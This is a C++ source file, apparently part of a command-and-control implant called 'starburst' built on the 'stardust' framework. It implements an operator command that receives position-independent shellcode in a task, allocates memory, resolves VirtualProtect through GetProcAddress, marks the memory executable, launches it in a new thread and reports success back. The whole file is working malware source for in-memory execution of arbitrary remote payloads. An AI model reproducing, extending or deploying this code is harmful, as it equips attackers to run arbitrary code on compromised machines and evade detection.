#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_EXECUTE_PIC

using namespace stardust;
using namespace starburst;

auto declfn starburst::cmd_execute_pic(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    uint32_t pic_len = 0;
    auto pic_data = parser_bytes( params, &pic_len );

    if ( !pic_data || pic_len == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "no PIC data provided" ) ) );
        return;
    }

    DBG_PRINT( inst, "cmd_execute_pic: %u bytes\n", pic_len );

    LPVOID mem = inst.kernel32.VirtualAlloc(
        nullptr, pic_len,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );

    if ( !mem ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "VirtualAlloc failed" ) ) );
        return;
    }

    memory::copy( mem, pic_data, pic_len );

    // resolve VirtualProtect via GetProcAddress
    DWORD old_protect = 0;
    typedef BOOL ( WINAPI *fn_VirtualProtect )( LPVOID, SIZE_T, DWORD, PDWORD );
    auto pVirtualProtect = reinterpret_cast<fn_VirtualProtect>(
        inst.kernel32.GetProcAddress(
            (HMODULE)inst.kernel32.handle,
            symbol<LPCSTR>( "VirtualProtect" ) ) );

    if ( !pVirtualProtect ) {
        inst.kernel32.VirtualFree( mem, 0, MEM_RELEASE );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "VirtualProtect resolve failed" ) ) );
        return;
    }

    pVirtualProtect( mem, pic_len, PAGE_EXECUTE_READ, &old_protect );

    HANDLE h_thread = inst.kernel32.CreateThread(
        nullptr, 0,
        (LPTHREAD_START_ROUTINE) mem,
        nullptr, 0, nullptr );

    if ( !h_thread ) {
        inst.kernel32.VirtualFree( mem, 0, MEM_RELEASE );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "CreateThread failed" ) ) );
        return;
    }

    inst.kernel32.CloseHandle( h_thread );

    char msg[64] = { 0 };
    str_copy( msg, symbol<char*>( const_cast<char*>( "executed " ) ) );
    char num[16];
    int_to_str( num, pic_len, 10 );
    str_concat( msg, num );
    str_concat( msg, symbol<char*>( const_cast<char*>( " bytes PIC" ) ) );

    queue_response( inst, task_uuid, RESPONSE_SUCCESS, msg );
}

#endif
